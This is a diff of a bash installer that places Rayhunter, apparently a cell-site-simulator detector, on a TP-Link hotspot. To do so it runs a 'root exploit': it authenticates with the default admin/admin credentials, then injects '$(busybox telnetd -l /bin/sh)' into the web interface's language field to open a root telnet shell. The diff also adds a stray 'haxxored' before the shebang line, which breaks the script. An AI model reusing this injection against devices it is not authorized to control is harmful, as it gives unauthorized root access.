@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+haxxored#!/usr/bin/env bash
 install() {
     if [[ -z "${ADB}" ]]; then
         echo "\$ADB not set, did you run this from install-linux.sh or install-mac.sh?"
@@ -7,37 +7,53 @@ install() {
 
     echo "make sure you have a vfat formatted sd card inserted!"
 
-    open_tplink
+    prepare_tplink
     setup_rayhunter
     test_rayhunter
 }
 
-open_tplink() {
+prepare_tplink() {
 
-	nonce=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)
-	
-	# use default credentials at first 
-	md5=$(printf "%s:%s:%s" ${1-admin} ${2-admin} "$nonce" | md5sum | cut "-d " -f1)
-	
-	printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"
+    echo start prepare_tplink
 
-	token=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)
+    echo run root exploit
 
-	printf "Token: %s\n" "$token"
+    nonce=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)
 
-	curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}' > /dev/null
-	curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"en"}' > /dev/null
+    # use default credentials at first 
+    md5=$(printf "%s:%s:%s" ${1-admin} ${2-admin} "$nonce" | md5sum | cut "-d " -f1)
 
-	echo Done.
+    printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"
 
-	(stty -icanon -echo; nc -O1 192.168.0.1 23)
-	
-	stty icanon echo
+    token=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)
 
-    # TODO mount vfat sdcard to /mnt/card
+    printf "Token: %s\n" "$token"
 
-	# TODO run usb_compositor and give input: 902B \n n \n y \n y \n
+    curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}' > /dev/null
+    curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"en"}' > /dev/null
 
+    echo Exploit done
+
+    echo activate adb per telnet session
+    expect <<EOF
+spawn nc 192.168.0.1 23
+
+expect "/ #"
+send "usb_composition 902B n y y\r"
+
+expect "/ #"
+send "exit\r"
+
+expect eof
+EOF
+
+    echo closed telnet session
+
+    echo mount sd card
+
+    _adb_shell mount /dev/mmcblk0p1 /mnt/card
+
+    echo finished prepare_tplink
 
 }
 
@@ -64,21 +80,17 @@ _adb_shell() {
 }
 
 setup_rayhunter() {
-    _at_syscmd "mkdir -p /data/rayhunter"
-    _adb_push config.toml.example /tmp/config.toml
-    _at_syscmd "mv /tmp/config.toml /data/rayhunter"
-    _adb_push rayhunter-daemon /tmp/rayhunter-daemon
-    _at_syscmd "mv /tmp/rayhunter-daemon /data/rayhunter"
-    _adb_push scripts/rayhunter_daemon /tmp/rayhunter_daemon
-    _at_syscmd "mv /tmp/rayhunter_daemon /etc/init.d/rayhunter_daemon"
-    _adb_push scripts/misc-daemon /tmp/misc-daemon
-    _at_syscmd "mv /tmp/misc-daemon /etc/init.d/misc-daemon"
+    _adb_shell "mkdir -p /data/rayhunter"
+    _adb_push config.toml.example /data/rayhunter/config.toml
+    _adb_push rayhunter-daemon /mnt/card/rayhunter-daemon
+    _adb_push scripts/rayhunter_daemon /etc/init.d/rayhunter_daemon
+    _adb_push scripts/misc-daemon /etc/init.d/misc-daemon
 
-    _at_syscmd "chmod 755 /etc/init.d/rayhunter_daemon"
-    _at_syscmd "chmod 755 /etc/init.d/misc-daemon"
+    _adb_shell "chmod 755 /etc/init.d/rayhunter_daemon"
+    _adb_shell "chmod 755 /etc/init.d/misc-daemon"
 
     echo -n "waiting for reboot..."
-    _at_syscmd "shutdown -r -t 1 now"
+    _adb_shell "shutdown -r -t 1 now"
 
     # first wait for shutdown (it can take ~10s)
     until ! _adb_shell true 2> /dev/null
